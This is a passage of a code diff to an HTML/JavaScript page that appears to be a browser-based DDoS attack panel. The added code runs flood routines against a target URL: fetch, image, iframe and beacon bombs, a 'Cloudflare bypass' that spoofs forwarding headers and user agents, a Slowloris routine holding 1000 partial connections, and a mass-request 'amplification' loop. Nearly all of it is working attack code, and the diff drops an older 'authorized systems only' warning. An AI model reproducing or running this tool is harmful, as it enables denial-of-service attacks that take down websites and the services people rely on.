+                        return;
+                    }
+                    nuclearMethods.wsFlood(url);
+                }, 500);
+                attackThreads.push(interval);
+            }
+            
+            // Fetch Bomb (50 threads)
+            for(let i = 0; i < 50; i++) {
+                const interval = setInterval(() => {
+                    if(!attackActive) return;
+                    nuclearMethods.fetchBomb(url);
+                }, 1000);
+                attackThreads.push(interval);
+            }
+            
+            // Image Bomb (30 threads)
+            for(let i = 0; i < 30; i++) {
+                const interval = setInterval(() => {
+                    if(!attackActive) return;
+                    nuclearMethods.imgBomb(url);
+                }, 500);
+                attackThreads.push(interval);
+            }
+            
+            // XHR Slow (20 threads)
+            for(let i = 0; i < 20; i++) {
+                const interval = setInterval(() => {
+                    if(!attackActive) return;
+                    nuclearMethods.xhrSlow(url);
+                }, 2000);
+                attackThreads.push(interval);
+            }
+            
+            // Beacon Spam (10 threads)
+            for(let i = 0; i < 10; i++) {
+                const interval = setInterval(() => {
+                    if(!attackActive) return;
+                    nuclearMethods.beaconSpam(url);
+                }, 500);
+                attackThreads.push(interval);
+            }
+            
+            // Iframe Bomb (5 threads)
+            for(let i = 0; i < 5; i++) {
+                const interval = setInterval(() => {
+                    if(!attackActive) return;
+                    nuclearMethods.iframeBomb(url);
+                }, 3000);
+                attackThreads.push(interval);
+            }
+            
+            log('☢️ NUCLEAR STRIKE ACTIVE: ' + attackThreads.length + ' THREADS RUNNING');
+        }
+        
+        function launchBypassAttack(url) {
+            log('🛡️ CLOUDFLARE BYPASS ATTACK INITIATED');
+            
+            // Rotating IPs and User Agents
+            for(let i = 0; i < 200; i++) {
+                const interval = setInterval(() => {
+                    if(!attackActive) return;
+                    
+                    // Multiple request methods per interval
+                    fetch(url + '?cache=' + Date.now() + Math.random(), {
+                        headers: {
+                            'User-Agent': randomUA(),
+                            'X-Forwarded-For': randomIP(),
+                            'CF-Connecting-IP': randomIP(),
+                            'X-Real-IP': randomIP(),
+                            'Referer': 'https://www.google.com/',
+                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                            'Accept-Language': 'en-US,en;q=0.9',
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Cache-Control': 'no-cache',
+                            'Pragma': 'no-cache'
+                        },
+                        mode: 'no-cors'
+                    }).catch(() => {});
+                    
+                    recordRequest(true);
+                }, 50);
+                attackThreads.push(interval);
+            }
+        }
+        
+        function launchSlowlorisUltra(url) {
+            log('🐌 SLOWLORIS ULTRA ATTACK STARTED');
+            
+            // Create many partial connections
+            for(let i = 0; i < 1000; i++) {
+                setTimeout(() => {
+                    if(!attackActive) return;
+                    
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', url);
+                    xhr.setRequestHeader('X-a', 'b');
+                    xhr.send(null);
+                    
+                    // Keep alive with partial headers
+                    let counter = 0;
+                    const keepAlive = setInterval(() => {
+                        if(!attackActive || counter++ > 30) {
+                            clearInterval(keepAlive);
+                            return;
+                        }
+                        try {
+                            xhr.send('X-' + counter + ': ' + 'x'.repeat(100) + '\r\n');
+                        } catch(e) {}
+                    }, 1000);
+                    
+                    attackThreads.push(keepAlive);
+                }, i * 10); // Stagger connections
+            }
+        }
+        
+        function launchAmplification(url) {
+            log('📡 AMPLIFICATION ATTACK SIMULATION');
+            
+            // Simulate amplification by multiple parallel requests
+            for(let i = 0; i < 500; i++) {
+                const interval = setInterval(() => {
+                    if(!attackActive) return;
+                    
+                    // Launch 10 parallel requests per thread
+                    for(let j = 0; j < 10; j++) {
+                        fetch(url + '?amp=' + Date.now() + j, {
+                            mode: 'no-cors'
+                        }).catch(() => {});
+                        recordRequest(true);
+                    }
+                }, 100);
+                attackThreads.push(interval);
+            }
+        }
+        
+        function stopNuclear() {
             attackActive = false;
             
             // Clear all intervals
-            attackIntervals.forEach(interval => clearInterval(interval));
-            attackIntervals = [];
+            attackThreads.forEach(interval => clearInterval(interval));
+            attackThreads = [];
             
             // Update UI
-            document.getElementById('startBtn').disabled = false;
+            document.getElementById('launchBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
+            document.getElementById('targetDisplay').style.color = '#0f0';
             
-            logToTerminal('🛑 BRUTAL ATTACK TERMINATED', 'error');
-            updateStats();
+            const duration = Math.round((Date.now() - startTime) / 1000);
+            log('🛑 ATTACK STOPPED AFTER ' + duration + ' SECONDS');
+            log('📊 TOTAL REQUESTS: ' + requestCount.toLocaleString());
+            log('🎯 SUCCESS RATE: ' + (requestCount > 0 ? 
+                Math.round((successCount / requestCount) * 100) + '%' : '0%'));
+            
+            updateDisplay();
         }
-
-        // Initialize
-        logToTerminal('[SYSTEM] Brutal HTTP/2 DDoS Panel Ready', 'success');
-        logToTerminal('[WARNING] Use only on authorized systems', 'warning');
-        setInterval(updateStats, 1000);
+        
+        function init() {
+            log('[SYSTEM] NUCLEAR DDoS PANEL READY');
+            log('[WARNING] THIS TOOL CAUSES DIRECT IMPACT');
+            log('[INFO] Set target URL and select attack type');
+        }
     </script>
 </body>
 </html>
